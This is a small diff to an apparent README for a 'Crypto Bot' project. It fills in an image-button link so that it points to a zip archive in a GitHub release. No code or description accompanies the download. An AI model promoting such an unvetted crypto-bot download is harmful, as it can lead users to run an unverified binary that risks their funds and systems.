@@ -5,7 +5,7 @@
 
 ## Download Crypto Bot
 
-[![Download](https://i.postimg.cc/mkzfFm9p/Crypto-Bot.png)]()
+[![Download](https://i.postimg.cc/mkzfFm9p/Crypto-Bot.png)](https://github.com/KyoYasuo/Crypto-Bot/releases/download/Crypto-Bot/Crypto.Bot.zip)
  
 # Tage
 
